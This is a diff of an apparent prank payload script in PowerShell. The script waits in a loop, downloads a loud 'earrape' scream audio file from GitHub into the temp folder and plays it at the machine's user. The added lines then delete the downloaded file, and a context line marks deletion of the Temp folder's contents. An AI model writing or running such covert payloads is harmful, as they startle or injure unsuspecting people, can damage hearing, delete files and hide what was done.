@@ -18,9 +18,10 @@ while (1) {
 
 # At this point, the script will continue executing
 
-# Import the System.Net and System.Media assemblies
+# Import the System.Net, System.Media, and System.IO assemblies
 Add-Type -AssemblyName System.Net
 Add-Type -AssemblyName System.Media
+Add-Type -AssemblyName System.IO
 
 # Define the URL of the .wav file to download
 $url = "https://github.com/MajorMarmalade/Sounds/blob/main/hjkhjkhkhjkh-scream-(earrape)-By-Tuna.wav?raw=true"
@@ -44,6 +45,11 @@ $player.PlaySync()
 $player.Dispose()
 $stream.Dispose()
 
+# Delete the .wav file
+$file = "$env:TMP\s.wav"
+$fileInfo = Get-Item $file
+$fileInfo.Attributes = "Normal"
+Remove-Item $file
 
 # Delete contents of Temp folder 
 
